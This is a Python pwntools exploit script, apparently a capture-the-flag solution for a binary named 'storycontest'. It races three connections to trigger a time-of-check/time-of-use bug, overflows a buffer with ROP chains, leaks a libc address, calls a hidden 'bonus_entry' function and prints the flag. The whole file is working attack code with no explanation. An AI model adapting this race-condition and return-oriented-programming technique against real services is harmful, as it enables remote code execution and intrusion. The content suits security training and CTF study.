from pwn import *
import time

context.log_level = 'warning'

exe = ELF("./storycontest_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 5555

SIZE = 300
exerop = ROP(exe)

def itb(i: int):
	return str(i).encode()

def toctou(tou: pwnlib.tubes.remote.remote, toc: pwnlib.tubes.remote.remote, length: int, payload: bytes):
	tou.sendline(b'1')
	tou.sendline(b'1')
	tou.recvuntil(b'[*] The jury is thinking (0.5s)...\n')

	toc.sendline(b'1')
	toc.sendline(itb(length))

	tou.send(payload)

def get_flag(re: pwnlib.tubes.remote.remote):
	re.sendline(b'4')
	re.recvuntil(b'winner! ')
	print("[*]", r2.recvline().decode().strip())


offset = 168

r1 = remote(host, port)
r2 = remote(host, port)
r3 = remote(host, port)

payload = b'\x00' * offset
payload += p64(exerop.ret.address)
payload += p64(exe.sym.gift)

print(f"[+] Triggering first TOCTOU...")
toctou(r1, r2, SIZE, payload)

# Leak
r2.sendline(b'3')
r2.recvuntil(b'gift: ')

stdout = int(r2.recvline().strip(), 16)
libc.address = stdout - 0x2045c0

print(f"[*] stdout => %#x" % stdout)
print(f"[*] libc base => %#x" % libc.address)

payload = b'\x00' * offset
payload += p64(libc.address + 0x000000000010f78b) + p64(0x1337c0de)
payload += p64(exe.sym.bonus_entry)
payload += p64(exe.sym.gift)

print(f"[+] Triggering second TOCTOU...")
toctou(r3, r2, SIZE, payload)

print(f"[*] Success! printing flag:")
get_flag(r2)

